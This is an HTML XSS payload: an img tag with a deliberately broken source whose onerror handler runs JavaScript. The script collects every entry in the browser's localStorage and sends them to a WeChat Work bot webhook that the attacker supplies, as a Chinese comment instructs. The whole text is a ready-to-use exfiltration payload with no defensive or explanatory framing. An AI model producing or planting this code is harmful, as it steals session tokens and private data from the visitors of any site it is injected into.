<img src="invalid-image" onerror="javascript: 
    (function() {
        function getAllLocalStorageData() {
            let data = {};
            for (let i = 0; i < localStorage.length; i++) {
                const key = localStorage.key(i);
                data[key] = localStorage.getItem(key);
            }
            return data;
        }

        function sendToWeChatWorkBot(webhookUrl, data) {
            fetch(webhookUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    msgtype: 'text',
                    text: {
                        content: JSON.stringify(data, null, 2)
                    }
                })
            })
            .then(response => response.json())
            .then(data => console.log('Success:', data))
            .catch((error) => console.error('Error:', error));
        }

        const webhookUrl = 'yourWeChatWorkWebhookUrl'; // 替换为您的企业微信机器人Webhook URL
        const localStorageData = getAllLocalStorageData();
        sendToWeChatWorkBot(webhookUrl, localStorageData);
    })();
">
